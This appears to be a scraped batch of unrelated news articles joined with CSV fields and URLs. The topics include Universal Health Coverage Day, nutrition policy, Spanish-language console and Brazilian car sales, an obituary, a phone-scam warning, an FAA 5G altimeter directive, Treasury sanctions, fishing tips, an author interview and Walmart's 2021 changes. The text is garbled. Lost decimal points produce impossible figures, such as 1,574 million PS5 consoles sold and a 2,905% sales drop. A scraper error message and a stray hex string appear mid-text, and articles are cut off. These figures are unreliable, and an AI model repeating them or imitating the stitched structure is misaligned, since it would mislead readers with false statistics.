CEO Nurezeman Gali explains: “I can say that PBF is the best thing that happened to this institution. The staff is also getting motivated not only by the bonus they receive from PBF but also by the improved work environment. The hospital is one of the youngest hospitals in the zone. It is becoming amongst one of the top hospitals in a very short time”

The PBF programme is made possible by the collaboration between the Oromia Regional Health Bureau Cordaid and the Embassy of the Kingdom of the Netherlands.

Universal Health Coverage: a plea for health as a basic human right

What does Universal Health Coverage stand for? UHC is first and foremost a plea for human rights because it is based on the common understanding that health is a basic requirement for a productive and dignifying life. With strong health systems other public service systems like education can be safeguarded. And with stronger education greater economic development can be fostered.

In his message marking the Day UN Secretary-General António Guterres said that with the third year of the pandemic fast approaching “we must urgently strengthen our health systems to ensure they are equitable resilient and capable of meeting everyone’s needs including for their mental health.”

Shockwaves

He added that “the shockwaves of this health emergency are hitting hardest those countries that lack health systems capable of providing quality affordable care for all.”

If the world is to reach the goal of achieving universal health coverage by 2030 there needs to be greater commitment from governments to investing in and scaling up proven solutions.

“This means making more and smarter investments in the foundations of health systems with an emphasis on primary health care essential services and marginalized populations” said Mr Guterres.

The best insurance for resilient economies and communities is strengthening health systems before crises emerge. “The unequal distribution of COVID-19 vaccines in the past year has been a global moral failure. We must learn from this experience. The pandemic will not end for any country until it ends for every country” said the UN chief.

Stresses and strains

In 2020 the pandemic disrupted health services and stretched countries’ health systems beyond their limits. As a result for example immunization coverage dropped for the first time in ten years and deaths from TB and malaria increased said the news release from WHO and the World Bank.

The pandemic also triggered the worst economic crisis since the 1930s making it increasingly difficult for people to pay for lifesaving healthcare.

“Even before the pandemic half a billion people were being pushed (or pushed still further) into extreme poverty because of payments they made for healthcare. The organizations expect that that number is now considerably higher.

“There is no time to spare” said WHO chief Tedros Adhanom Ghebreyesus. “All governments must immediately resume and accelerate efforts to ensure every one of their citizens can access health services without fear of the financial consequences.

“This means strengthening public spending on health and social support and increasing their focus on primary health care systems that can provide essential care close to home.”

Faltering progress

“Prior to the pandemic many countries had made progress. But it was not robust enough. This time we must build health systems that are strong enough to withstand shocks such as the next pandemic and stay on course towards universal health coverage.”

The new WHO/World Bank reports also warn that financial hardship is likely to become more intense as poverty grows incomes fall and governments face tighter fiscal constraints.

“Even before the COVID-19 pandemic struck almost 1 billion people were spending more than 10 per cent of their household budget on health” said Juan Pablo Uribe Global Director for Health Nutrition and Population World Bank. “This is not acceptable especially since the poorest people are hit hardest. Within a constrained fiscal space governments will have to make tough choices to protect and increase health budgets” he added.

In the first two decades of this century many governments had made progress on service coverage said WHO and the World Bank.

In 2019 prior to the pandemic 68 per cent of the world’s population was covered by essential health services such as reproductive health services; immunization services; treatment for HIV TB and malaria; and services to diagnose and treat noncommunicable diseases like cancer heart conditions and diabetes.

But they had not made care more affordable. “As a result the poorest groups and those living in rural areas are the least able to obtain health services and the least likely to be able to cope with the consequences of paying for them.”",https://news.google.com/articles/CBMiKGh0dHBzOi8vaGVhbHRocG9saWN5LXdhdGNoLm5ld3MvOTIzMjAtMi_SAQA?hl=en-US&gl=US&ceid=US%3Aen,Universal Nutrition Coverage: A Transformative Opportunity For Health And Food Advocates,"On Universal Health Coverage Day – an appeal to food and health advocates to shape an agenda for ‘Universal Nutrition Coverage’ including joined-up solutions that promote sustainable agro-ecosystems producing healthier foods for people with co-benefits for the planet.

Every year on December 12 the health community marks Universal Health Coverage (UHC) Day. While the technical definition of UHC focuses on health services (‘UHC means that all individuals and communities receive the quality health services they need without suffering financial hardship’) the concept has come to represent more than this. UHC is about equity the progressive realisation of ‘health for all’ and leaving no one behind.

Nutrition is one of the fundamental determinants of health. Yet globally the impacts of poverty and other socio-economic determinants of health on the increased prevalence of malnutrition mean that we are off track to meet five out of six maternal infant and young children nutrition targets and all diet-related non-communicable disease (NCD) targets. Unhealthy diets combined with sedentary lifestyles are the leading risk factor for disability and death from NCDs worldwide. It is estimated that about 3 million people worldwide cannot afford a healthy diet.

Industrialized food systems – failing to deliver health

Many point to the industrialized food system as the cause. Mounting evidence shows that it is failing to deliver health; a situation inextricably linked to and exacerbated by the COVID-19 pandemic in which food insecurity has risen and people living with obesity have been especially at risk. Food systems transformation is urgently needed to achieve universal health and good nutrition for all.

The food we eat and how it is produced packaged shipped consumed and wasted also has a deep impact on animal and ecological health. Food production contributes to more than a third of all greenhouse emissions and is one of the main drivers of catastrophic biodiversity loss today.

Similarly last week a new study by the UN Food and Agriculture Organization confirmed that soils are one of the main receptors of agricultural plastics — containing larger quantities of microplastics than oceans. At COP26 food systems transformation and the need for healthy and sustainable diets was an important theme discussed in many side events building on efforts begun at the UN Food Systems Summit.

Also last week the Tokyo Nutrition for Growth Summit (N4G) which concluded on 8 December put the spotlight on global nutrition goals aiming to renew and generate new actionable commitments for attaining nutrition-related Sustainable Development Goals and WHO targets aligned with national priorities. Top of the agenda at N4G was the theme ‘Integrating nutrition into universal health coverage (UHC)’.

UHC criticised for too much focus on curative health services – nowhere is this clearer than in the case of nutrition

Alongside global health security UHC is a dominant paradigm in global health. It has however been criticised for its focus on individual-based curative health services as opposed to population-based preventative public health approaches.

Nowhere is this clearer than when looking at nutrition. We need stronger health systems to provide services to treat malnutrition in all its forms; but we also need deeper collaboration between food and health sectors so that together we can think more holistically about our shared roles in a whole-of-society approach to improve nutrition outcomes and address the root causes of poor nutrition in ways that co-benefit the planet too.

This UHC day is an opportunity to catalyze further action and progress made in 2021 and imagine what Universal nutrition coverage would look like. To us this means a world where all people receive the nutrition they need without suffering financial hardship in ways that follows the “one health” approach and that calls for ensuring equitable benefits to human animal and ecological health.

At COP26 we witnessed a huge and timely effort by the health sector to make sure health is at the heart of national climate policies: more than 460 health organisations representing more than 46 million health workers in over 100 countries have signed the ‘Healthy Climate Prescription’ letter which calls for stronger action on climate change to protect people’s health.

Interconnected food-health pathways: unhealthy diets & food insecurity; food safety zoonotic pathogens and environmental contamination; and occupational hazards

A new narrative by WHO “Food Systems Delivering Better Health” also describes five interconnected and interrelated pathways between food and health: unhealthy diets and food insecurity; zoonotic pathogens and antimicrobial resistance; unsafe and adulterated foods; environmental contamination; and degradation and occupational hazards.

Yet there’s still much to do: the links between climate health and food systems – for example as described in the 2019 Lancet Commission Report The Global Syndemic of obesity undernutrition and climate change – are still not being fully capitalised on at the UN Food Systems Summit COP26 or at the recent N4G in Tokyo.

Governments and the private sector have critical roles to play in improving nutrition and creating the enabling environments for equitable access to healthy and sustainable diets and health sector professionals are also critical agents of change and influence. Youth such as medical students and future healthcare professionals are already advocating for the inclusion of food systems in the public health field.

They are empowering themselves with the required knowledge skills and competencies and they are using innovative approaches such as online courses workshops small working groups and simulations to widen the horizon on the interlinkages between food nutrition and health. They are engaging their communities through webinars and campaigning based on research and policy analysis.

As we look ahead to 2022 with the annual World Health Assembly in May and COP27 later in Egypt we must all work together reaching across geographies economic sectors and professional silos. We need to mobilize around the levers of change to which we have access to in order to ensure that healthy sustainable diets are a reality for all – as we strive towards universal health and universal nutrition. \

We invite all those working in the health sector to consider universal nutrition coverage and what they can do to ‘leave no one’s nutrition behind’. Youth leaders in particular have an opportunity to lead the way forward.

Malnutrition is not an unknown virus it is a ‘known known’ which we can and must tackle through radical and hopeful food systems transformation.

Por ello ya han superado en ventas a Wii U y Dreamcast respectivamente.

¿Cómo llevan las consolas actuales sus ventas con respecto a las anteriores? Parece que bien según se mire porque PS5 y Xbox Series X ya han superado en ventas a Wii U y Dreamcast.

Gracias a la lista siempre actualizada de VGChartz podemos ver las ventas de consolas. Porque además de ir viendo su evolución también podemos compararlas con el hardware pasado y actual.

El total de unidades vendidas se contabiliza en todo el mundo y está puesto por millones por plataforma. Para todas las que ya no se fabrican el total son las que se enviaron por el fabricante.

En el caso de las plataformas que están ahora mismo a la venta las unidades están medidas por la propia VGChartz. Dicho esto pasemos al quid de la cuestión que es lo que nos atañe ahora mismo.

En dichos datos de la web vemos que PlayStation 5 está ahora mismo en el puesto 22 de la lista. La consola ha vendido mucho más en Norteamérica seguido de Europa con 622 y 602 millones de consolas.

A estos territorios les sigue el resto de territorios con 231 millones y por último Japón con 119 millones. En total las cifras que ostenta ahora mismo PlayStation 5 en cuanto a consolas vendidas son de 1574 millones.

Esto ha servido para superar a la predecesora de Nintendo Switch Wii U en el puesto 23. Con 623 millones en Norteamérica 354 en Europa 333 en Japón y 087 en el resto de mercados el hardware vendió en total 1397 millones de consolas.

Si echamos un vistazo a Xbox Series X|S (juntas) en el puesto 25 tienen números similares. En Norteamérica han vendido 525 millones en Europa 317 en Japón 012 y en el resto de mercado 154; todo esto hace que sumen un total de 1008 millones en todo el mundo.

Pero eso ya le ha servido para superar a Dreamcast en la 25º posición. Con 390 millones vendidas en Norteamérica 191 en Europa 225 en Japón y 014 en el resto de mercados cerró su vida con 820 millones de consolas vendidas en todo el mundo.

¿Y qué pasa con Nintendo Switch? Pues la híbrida sigue haciendo números de escándalo porque hace poco se supo que ya ha sobrepasado a PS3 y a Xbox 360 ambas consolas de Sony y Microsoft.

Estando ahora mismo en 7ª posición las estimaciones de VGChartz dan a Switch 3639 millones de consolas vendidas en Norteamérica 2544 en Europa 2222 en Japón y 1321 en el resto de mercados.

Eso hace que según estos números lleve un total de 9726 millones de Switch vendidas en todo el mundo. A este ritmo dentro de poco superará a una de sus hermanas Nintendo Wii.

¿Qué os parecen estas cifras de ventas?

La comerciante Ana Laura Espino dijo que con la reactivación de las peregrinaciones y las veladas a la virgen la situación en cuanto a las ventas mejoraron de manera significativa pero aún a comparación de años anteriores a la pandemia siguen siendo bajas.

La situación está mejorando este año porque ya se permitieron las festividades"" expresó.

En este mismo sentido señaló que este año no se dieron incrementos en los costos debido a que muchos comerciantes trabajaron con mercancía que no vendieron el año pasado.

Manifestó que de todo lo malo que se ha tenido la situación empieza a cambiar desde este día en que se celebra a la Virgen de Guadalupe porque mucha gente le pidió que se recuperara la salud la cual se vio afectada de manera considerable con la pandemia.

La comerciante indicó que lo que más ha vendido en estos momentos son las imágenes de la virgen los trajes de indios para niñas y niños así como adornos de papel y luces que también son colocados en los altares a la ""Morenita"".

En el mes de noviembre de 2021 las ventas de coches en Brasil alcanzaron las 125.974 unidades. Este volumen de matriculaciones comparado con el obtenido en el mismo periodo de tiempo del ejercicio anterior supone una caída del 2905%. Es un retroceso prácticamente idéntico al obtenido en octubre.

Los datos de estos últimos meses suponen una pesada losa que lastra las cifras acumuladas. Y es que en el periodo comprendido entre los meses de enero y noviembre las matriculaciones de coches nuevos contabilizaron 1.401.832 unidades un 134% menos respecto a los once primeros meses de 2020.

Los Chevrolet Onix y Onix Plus lideran las ventas de coches en Brasil

Chevrolet Onix el coche más vendido en Brasil en noviembre de 2021

En los últimos tiempos el modelo de Chevrolet se ha visto muy afectado por los problemas de stock en los concesionarios causados por el desabastecimiento de semiconductores en las fábricas. ¿Han quedado atrás los problemas del Onix en Sudamérica? Es demasiado pronto para aventurarlo. Aunque si bien es cierto que este magnífico resultado deja un gran margen para el optimismo.

El Chevrolet Onix Plus ha quedado segundo y cerrando el podio en tercer lugar tenemos al Volkswagen Gol. A las puertas del podio se ha quedado el FIAT Argo modelo que ha venido liderando las ventas meses atrás y que precisamente en el ranking acumulado sigue en primera posición.

El nuevo FIAT Pulse ya está en los concesionarios brasileños

En quinto lugar aparece el SUV más vendido en Brasil durante noviembre el Hyundai Creta. Además en el decimoprimer mes se ha materializado la llegada del nuevo FIAT Pulse a los concesionarios ya que se produjeron las primeras matriculaciones.

Richard Fipphen 62

Richard Churchill Fipphen 62 died on June 5 2021 in Bridgeport Connecticut. Rich was born in Worcester Massachusetts on January 16 1959 the son of John Stanley Fipphen and Christine Lois (Churchill) Fipphen. He was a proud descendant of 16 passengers on the Mayflower voyage of 1620 and he felt a deep connection to his ancestors throughout his life.

Rich grew up in Northborough Massachusetts and graduated from Algonquin Regional High School in 1977. He graduated from Bates College in 1981 and Cornell Law School in 1984. He married Janet Rosenblum in 1985 and they raised their family in Connecticut. Rich worked as an attorney for Verizon and MCI Communications for over 30 years.

He lived in New York City for 8 years during which time he volunteered at a non-profit museum as a docent.

Officials said scammers have been calling people and identifying themselves as Lane County Sheriff's Office and will often go as far as identifying themselves using the names of real office employees and providing a fraudulent number for the person to call back.

When people call the number back they are then taken to a phone tree system that is designed to sound like the official Sheriff's Office phone tree.

Other local scams:Have you been contacted about jury duty? It could be a scam

""The scammers will then commonly make claims that there are warrants or unsettled legal business that involve the victim or someone the victim knows and ask for personal or financial information"" a news release stated. ""The Lane County Sheriff's Office will never ask for money awards or compensation of any type over the telephone.""

If people are contacted in this way or believe they have been scammed they should call the county's dispatch center at 541-682-4150 and choose option 1.

Tips to avoid scammers

A USA TODAY article about a rise in new robocall tactics earlier this year gave these tips to help people avoid being scammed:

Hang up. If you answer the phone and hear a recorded message you can hang up. It's likely a scammer. Use call blocking technology. Wireless providers including AT&T T-Mobile and Verizon have technology to block calls from getting to consumers so check with your provider about possible call blocking features. Some of these will now show warnings like ""Likely Spam"" as a call comes in. Check the number. A scammer can make their call look like its coming from a local number but check to see if it is one you recognize. Read up on robocalls. More information about robocalls scam calls and call blocking can be found at the FCC website and FTC website.

Radio Altimeter is a device that measures altitude above the terrain presently beneath an aircraft or spacecraft by timing how long it takes a beam of radio waves to travel to the ground reflect and return to the craft.

Commuter-category aircraft (Aircraft that travel from a small regional airport to the main airport) including all helicopters equipped with RadAlts will have to follow his new directive. The FAA states “Radio altimeters cannot be relied upon to perform their intended function if they experience interference from wireless broadband operations in the 3.7-3.98 GHz frequency band.”

Operators should now review their aircraft’s flight manual to restrict using RadAlts in areas of 5G influence which NOTEAMs identify (Notices for Airmen). Airports where the use of radio altimeter is not dependable will be issued to NOTAMs. Use of Instrument landing system(ILS) Required navigation performance( RNP) Automatic Landing Operations and Head-up display (HUD) or Enhanced flight vision system (EFVS) which are essential instruments for a pilot can fall under prohibited operations.

Although the deployment of the 5G network was planned to start on December 5 telecommunication companies like AT&T and Verizon will now deploy them one month later on January 5 2022 as per FAA’s request. A proposal was submitted to FCC (Federal Communications Commission) to lower the problems by reducing the power levels at various 5G stations around airports and heliports.

Andrew Roy Director of engineering services with Annapolis said that the telecommunications companies still haven’t provided maps of 5G tower locations.



He added “There was a comment from the AT&T CEO the other week who said that for the proposal Verizon and AT&T had put forward his estimate was that it was single digits—maybe even less than that—as a percent of total [5G] towers that would be affected by this. Certainly from the 5G perspective we don’t think it’s a major issue to start considering at least around airports. Obviously the helicopter concern is still there.”"

Excerpts from a press release issued by the U.S. Department of the Treasury:

Washington - Today on International Anti-Corruption Day the U.S. Department of the Treasury's Office of Foreign Assets Control (OFAC) is targeting fifteen individuals and entities across several countries in Central America Africa and Europe. Today's actions are taken pursuant to Executive Order (E.O.) 13818 which builds upon and implements the Global Magnitsky Human Rights Accountability Act and targets perpetrators of corruption and serious human rights abuse.

Treasury's actions today are complemented by the U.S. Department of State's announcement of visa restrictions under Section 7031(c) of the Department of State Foreign Operations and Related Programs Appropriations Act targeting several corrupt current and former officials as well as their immediate family members and making them ineligible for entry into the United States.

""Corrupt acts take resources from citizens undermine public trust and threaten the progress of those who fight for democracy"" said Secretary of the Treasury Janet L. Yellen. ""Treasury is committed to countering those who seek personal enrichment at the expense of the people who trust them to to serve — especially in the middle of a global pandemic. We are taking these actions today to expose and hold corrupt leaders accountable."" ...

CORRUPTION IN SOUTH SUDAN: ARC RESOURCES CORPORATION LTD AND WINNERS CONSTRUCTION COMPANY LIMITED

OFAC designated ARC Resources Corporation Limited (ARC Resources) and Winners Construction Company Limited (Winners) for being owned or controlled by Benjamin Bol Mel (Bol Mel) an individual included in the Annex of E.O. 13818 in December 2017.

Bol Mel previously oversaw ABMC Thai-South Sudan Construction Company Limited (ABMC) which was awarded contracts worth tens of millions of dollars by the Government of South Sudan (GoSS) and allegedly received preferential treatment from high-level GoSS officials in a non-competitive process for selecting ABMC to do roadwork throughout South Sudan.

ARC Resources is linked to ABMC and has been used by senior members of GoSS for laundering money. Both ARC Resources and Winners have been used to evade sanctions and travel restrictions on Bol Mel and have been awarded noncompetitive and substantial oil-backed contracts from the GoSS for road construction.

ARC Resources and Winners are designated pursuant to E.O. 13818 for being owned or controlled by directly or indirectly Bol Mel a person whose property and interests in property are blocked pursuant to E.O. 13818....

SANCTIONS IMPLICATIONS

As a result of today's action all property and interests in property of the persons above that are in the United States or in the possession or control of U.S. persons are blocked and must be reported to OFAC. In addition any entities that are owned directly or indirectly 50 percent or more by one or more blocked persons are also blocked. Unless authorized by a general or specific license issued by OFAC or otherwise exempt all transactions by U.S. persons or within (or transiting) the United States that involve any property or interests in property of designated or otherwise blocked persons are prohibited. The prohibitions include the making of any contribution or provision of funds goods or services by to or for the benefit of any blocked person or the receipt of any contribution or provision of funds goods or services from any such person.

GLOBAL MAGNITSKY

Building upon the Global Magnitsky Human Rights Accountability Act E.O. 13818 was issued on December 20 2017 in recognition that the prevalence of human rights abuse and corruption that have their source in whole or in substantial part outside the United States had reached such scope and gravity as to threaten the stability of international political and economic systems. Human rights abuse and corruption undermine the values that form an essential foundation of stable secure and functioning societies; have devastating impacts on individuals; weaken democratic institutions; degrade the rule of law; perpetuate violent conflicts; facilitate the activities of dangerous persons; and undermine economic markets. The United States seeks to impose tangible and significant consequences on those who commit serious human rights abuse or engage in corruption as well as to protect the financial system of the United States from abuse by these same persons.

MLF pro Edwin Evers breaks down when where and how to fish lipless crankbaits to catch bass throughout the year emphasizing the fall and spring cold water periods.

Here are Evers 5 lipless crankbait tips for catching more bass:

Match bait size to the forage. Understanding forage type and size is a critical piece to lure selection. Bass often key in on a particular size and species of baitfish. Matching your lure will improve your odds of getting bit. Match bait size to the depth. Unlike most moving baits lipless crankbaits single fast and can be fished at a range of depths from shallow grass to deep ledges. When targeting bass relating to shallow grass or feeding on small shad a 1/4-ounce lipless is the go-to. Step up to a 1/2- or 3/4-ounce bait when baitfish size increases or you need to get deeper with the bait. Make the bait do something different. Evers stresses NOT to get into a cast and retrieve routing. Instead manipulate the bait action with a mix of rod tip actions (pulls and snaps) and retrieve speed changes. Focus efforts on wind-blown shorelines and pockets. Wind concentrates plankton and baitfish. When you get to the lake make a quick note of wind direction and consider starting your search around wind-exposed areas. Change rod angle to control running depth. Keep your rod tip high when you want the bait to run shallow such as burning over a grass flat. Lower your rod tip in conjunction with slowing the retrieve speed when a deeper running depth is desired.

The pals are on a reunion trip to Spain when a strange terrifying new virus begins rapidly spreading across the globe upending daily life as they know it. No not that virus. The introduction page to the book actually has a note to the reader: “The writing of this novel preceded COVID-19 and therefore there is no mention of the real-life pandemic. In this fictional universe it does not exist.” We talked to Martin about the strange experience of having your fiction come to life.

You wrote a novel about a pandemic and then a pandemic happened.

It’s been very surreal. I’ve always had a fascination with infectious diseases and I had to do a lot of research during a part of my career in ER medicine. I read a lot of nonfiction – books like “The Great Influenza” by John Barry and “Crisis in the Red Zone” by Richard Preston. It’s obvious in hindsight but infectious disease doctors have been sounding the drum for a long time that a pandemic is going to come and how prepared are we? When I wrote the book I had intended it as a cautionary tale.

You’ve left the ER but you’re still a doctor. When do you have time to write?

During the pandemic I volunteered in vaccine clinics. I had a great job offer a few years ago. I live in Charlotte NC. The business district had an allergy clinic and they wanted an ER doctor onsite. I got this job where I could be in a room doing nothing. They warned me I would be bored but I took the job. It gave me time to finish my novel and work normal hours for the first time in my life! This segued into me writing pretty much full time but I have kept my [medical] focus up.

I am struck by how much you predicted. Not just in terms of the virus but in terms of small details about how the pandemic upends daily life. For doctors was COVID-19 not that much of a reach to imagine?

If I had to put money on it i would have bet on a respiratory virus I would have guessed influenza. SARS and MERS were wakeup calls. When I originally started writing this book I had the virus [in the book] as a form of super flu like 1918. But then I decided to make up a virus so I crowdsourced a bunch of total nerds at the CDC. There are big online groups of female doctors and for the purposes of fiction my virus had to be completely terrifying without everyone dying. With COVID-19 what was a big surprise [for the medical community] was how weird it turned out to be — all these different body parts affected in different ways.",https://news.google.com/articles/CBMiX2h0dHBzOi8vYmxlZWRpbmdjb29sLmNvbS90di9zYXZlZC1ieS10aGUtYmVsbC1zZWFzb24tMi1lMDgtcmV2aWV3LXNvbWUtbGlmZS1hbHRlcmluZy1kZWNpc2lvbnMv0gEA?hl=en-US&gl=US&ceid=US%3Aen,Saved by the Bell Season 2 E08 Review: Some Life-Altering Decisions,ERROR: Article `download()` failed with 403 Client Error: Forbidden for url: https://bleedingcool.com/tv/saved-by-the-bell-season-2-e08-review-some-life-altering-decisions/ on URL https://news.google.com/articles/CBMiX2h0dHBzOi8vYmxlZWRpbmdjb29sLmNvbS90di9zYXZlZC1ieS10aGUtYmVsbC1zZWFzb24tMi1lMDgtcmV2aWV3LXNvbWUtbGlmZS1hbHRlcmluZy1kZWNpc2lvbnMv0gEA?hl=en-US&gl=US&ceid=US%3Aen

Most recently these initiatives include overcoming barriers to market access for women smallholder farmers through the Walmart Foundation Market Access program supporting the empowerment of women in factories through the Empower@Work Collaborative and sourcing from women-owned businesses in the U.S. and other markets. Over the past 10 years we have sourced more than $42 billion with women-owned businesses.

Walmart Foundation’s Market Access program launched in 2017 focuses on helping Farmer Producer Organizations build capacity in India Mexico and Central America to help smallholder farmers prosper. Since 2017 the Walmart Foundation has provided grants worth $86 million which are expected to reach more than one million smallholder farmers in India Mexico and Central America 320000 (or 50%) of whom are women.

These programs are strengthening farmer livelihoods enhancing value chains growing the adoption of sustainable agriculture practices unlocking access to finance growing formal market linkages strengthening FPOs and empowering women farmers in FPOs. As part of this total reach to smallholders the Walmart Foundation's smallholder investments in India to date include over $39 million making good on a 2018 commitment to invest $25 million over five years to improve farmer livelihoods in that country. The Walmart Foundation's recently published white paper Seeding advancement of women in smallholder farming: insights from the Market Access portfolio highlights lessons learned from its Market Access portfolio. We found that the following areas are most successful in accelerating female farmers’ economic prosperity: women’s membership and leadership in farmer producer organizations women’s skills and capacity development in farm production systems women’s inclusive crop and marketing programs and women’s access to finance.

COVID-19 created devastating impacts on global supply chains. Low-wage predominantly female garment workers have been disproportionately impacted both by being put at risk and by spending savings on food and medical expenditures for their families. In October 2020 to promote benefits to factory workers with a focus on women’s well-being Walmart entered into a Memorandum of Understanding (MOU) with other retailers and the United States Agency for International Development (USAID). The MOU aims to establish a dialogue and identify any steps in the framework for further cooperation in activities that provide much-needed livelihood relief to the predominantly female workers in the supply chain.

Walmart continues initiatives to source from women-owned businesses and support related initiatives such as the Women’s Business Enterprise National Council (WBENC) Student Entrepreneur Program the NextGen program (nurturing millennial and Generation Z enterprises) and the Women of Color program (aimed at increasing their competitiveness for inclusion in corporate supply chains).

We will continue to integrate efforts to support gender equity throughout our business ranging from responsible sourcing standards and social auditing practices along the supply chain to internal gender equity policies practices and commitments.",https://news.google.com/articles/CBMiP2h0dHBzOi8vd3d3LmVhdHRoaXMuY29tL25ld3Mtd2FsbWFydC1iaWdnZXN0LWNoYW5nZXMtdGhpcy15ZWFyL9IBAA?hl=en-US&gl=US&ceid=US%3Aen,10 Biggest Changes Walmart Made This Year — Eat This Not That,"The pandemic changed the shopping landscape for many industries and it was never more crucial for businesses to adjust. For the past two years shoppers have been interacting with grocery stores in new ways—limiting their in-person grocery runs opting for budget-friendly alternatives and even relying on in-store vaccination services.

Walmart is known for being the mega superstore that you can step inside of and find everything from affordable home goods and groceries to chain dining options. So it may not come as a surprise that the company made dedicated efforts to adapt and continue serving their customers on unfamiliar terrain.

And going the extra mile is working for the big-box retailer. Walmart's online sales have skyrocketed increasing by 87% over the past two years according to a November 2021 consumer report by Digital Commerce 360. Their e-commerce segment is consistently seeing growth even as the pandemic tapers and consumers return to their pre-COVID shopping trips.

The company made successful initiatives throughout 2021 that bolstered their spot at number one on the Fortune 500 list of companies according to their revenue. Here are 10 of the most notable changes that Walmart implemented to meet consumers' evolving needs this year.

Walmart opened quick shopping fulfillment centers.

With surging demand for online orders Walmart is leveraging automated robots to help with pickup and delivery in their new market fulfillment centers. They piloted the first location in Salem N.H. at the end of 2019 and found they could efficiently build orders in just a few minutes using both bots and personal shoppers for quality assurance.

So far there are additional plans for fulfillment centers in Jacksonville Fla. Dallas-Fort Worth Texas. and Lebanon Tenn.

""Walmart's fulfillment center…will play an important role in our broader supply chain network focused on fulfilling Walmart.com orders and supporting our promise of free next-day and two-day shipping"" Senior Vice President of Walmart U.S. Steve Miller said about the Lebanon opening in a press release.

Walmart added extra delivery times.

Holiday shopping is already hectic. Before Thanksgiving you have weeks to search for the perfect gifts. But after? Suddenly there's so much to do and so little time.

Luckily Walmart revealed a solution for this predicament in 2021—shipping straight to your door until 10 pm with additional time slots for the busy shopper. The superstore announced that the extended service includes at-home delivery for bigger items that you'd rather not haul in your car like TVs and bicycles. For 1500 locations they're also adding alcohol as a delivery option.

So don't start the car. If you're in a pinch you can simply shop from home and get the same deals with extra convenience.

Walmart held a sales event to rival Amazon Prime Day.

By now it's become an annual expectation to get more bang for your buck and buy all your big-ticket items on Amazon's Prime Day. But Walmart has been hosting their own markdown occasions and this year was no exception.

The four-day ""Deals for Days"" event started on June 20 one day before Prime Day and included both online and in-store sale pricing. Customers shopped for electronics toys home goods beauty and fashion at discounted prices. It's not official yet but we might see this become another annual event to mark on our calendars.

Walmart suspended congress donations.

The Jan. 6 capitol insurrection in Washington D.C. was a pivotal moment in 2021 and the country is still dealing with the fallout. Corporations took a stand against the violent acts of that day and Walmart was one of them.

Previously a large financial contributor to members of Congress to the tune of over $4.5 million in 2020 the superstore announced they would indefinitely suspend all political donations to the Congress members who objected to election results shortly after the attack.

However according to USA Today Walmart donated $30000 to the National Republican Congressional Committee in April where two-thirds of members were part of the dissenting party and another $30000 to the National Republican Senatorial Committee led by Sen. Rick Scott of Florida who also contested the results.

This stirred controversy because while the company did not donate directly to those members money given to the PAC is likely to contribute towards their campaigns. From the perspective of former senior counsel at the Federal Election Commission Daniel Weiner he told USA Today ""I don't think these companies are giving to these groups because they supported the insurrection. They give money — and are pressured to give money — for a lot [of] reasons all related to their bottom line.""

Walmart closed stores for COVID precautions.

In May 2021 you may have tried going to Walmart and discovered it was temporarily closed. That's because the store continued to be cautious during the ongoing pandemic by shutting down locations for deep cleaning.

Some locations that were affected were Lincoln Ill. Mason Ohio Williston N.D. El Paso Texas and Franklin Ky. and many more which were all closed to shoppers for over 40 hours.

People have had concerns about in-store safety and companies have responded accordingly. Earlier in the pandemic Walmart made similar temporary closures to ensure that conditions for workers and customers were safe amidst the novel virus spreading nationwide.

Walmart shut down pick-up towers.

The massive orange vending machines that sat in the front of most Walmart stores were introduced in 2016 to allow customers to order merchandise online and pick it up in the store quickly and conveniently. But in the thick of a pandemic shoppers grew hesitant to step inside stores. So the company decided to close the 17-foot tall orange towers across their locations and shift resources toward curbside pick-up instead.

The Wall Street Journal said that 300 will be removed from stores while 1300 have been ""hibernated"".

Walmart stalled new pharmacy locations.

To expand the products and services you can find inside the superstore giant Walmart planned to open new health centers across thousands of locations. The vision for ""Walmart Health"" included primary and urgent care labs x-ray and diagnostics counseling dental optical and hearing services a one-stop-shop for all your healthcare needs.6254a4d1642c605c54bf1cab17d50f1e

But the growth of opening new locations seems to have slowed. Despite Walmart announcing a target of 22 clinics by early 2021 the chain only has 20 health centers currently operating.

However according to Forbes they've still made strides in providing accessible healthcare this year: extending services to telemedicine appointments offering more affordable prescriptions and launching an analog insulin to compete against higher-priced insulin for diabetic patients.

Walmart offered COVID-19 vaccines.

The vaccine outreach in the United States required a combination of forces. The federal government worked hard to minimize the threat of COVID partnering with grocery chains to make the vaccine available to people who have little access to health care services.

Walmart built the capacity to ""be able to deliver 10 million to 13 million doses per month at full capacity using its network of more than 5000 pharmacies in the United States and Puerto Rico"" according to Reuters back in January. The superstore provided the doses in pharmacy locations across 10 states at that time offering both Pfizer and Moderna to the public.

As vaccine regulations have evolved the corporation continues to be a partner for the vaccine initiative. Once the FDA authorized the use of Pfizer for children ages 5 to 11 in November 2021 Walmart announced it would be rolling out the child-sized doses across over 5100 of its pharmacies.

Walmart introduced new in-store fast food.

You can buy pretty much anything at Walmart. They sell everything from engagement rings to caskets. And now with the restaurant additions from this year you can also find fast food from 12 different chains across various locations. Whether you're craving some greens from Saladworks or a pork bun from Wow Bao you can find them all while you're making your weekly grocery run.

This news comes after the split with McDonald's and Subway due to lower sales volume during the pandemic's peak when shoppers were wary of dining in-store Supermarket News reported.

New restaurant partners such as French bakery la Madeleine took the opportunity to get in front of Walmart customers. In a press statement the bakery chain's CEO Lionel Ladouceur said ""We look forward to making it even more convenient for the [Dallas-Fort Worth] community to enjoy the la Madeleine experience while also introducing our French comfort food to Walmart shoppers that are looking for more diverse dining choices.""

Walmart pioneered shoppable livestreams.

Social media is now the primary method of marketing for companies with over 70% of businesses relying on it to drive customer engagement according to Forbes. And Walmart has crafted a new way of integrating influencership to better connect with shoppers.

This November marks one year of Walmart's shoppable livestreams leveraging Tik Tok Twitter and YouTube to bring viewers and their favorite social media hosts together. Shoppers can tune in as the host showcases their favorite Walmart fashion picks and buy items they like without leaving the platform.

The very first shoppable livestream was in December 2020 hosted by TikTok influencer Michael Le (@justmaiko) who is followed by 51.5 million users for his dancing content. Walmart found success with this format holding 15 livestreams over the past year with a variety of celebrity guest hosts (think: Jason Derulo). For the holidays they plan to host over 30 livestreams to provide curated product picks to captivated customers.

William White Chief Marketing Officer for the company wrote ""We believe the future of retail lies in social commerce which is why we're focusing on innovating in the space as we continue to offer our customers ways to live better – whether online or in store the future of holiday shopping remains bright at Walmart.""

(WHDH) - Customers may have said “Nay” to a South Shore cowboy’s attempt to take his horse into a local Wal-Mart but he says he’ll keep riding the roads with his trusty steed.

Zacc Dickerson and his horse Nugget were looking for some food last week and when Chick-Fil-A was closed he headed over to the Plymouth Wal-Mart. Dickerson said an employee said it was OK for the horse to enter the store and passers-by got footage of Nugget about to hunt for bargains — but a shopper objected to Dickerson bringing Nugget past the lobby.

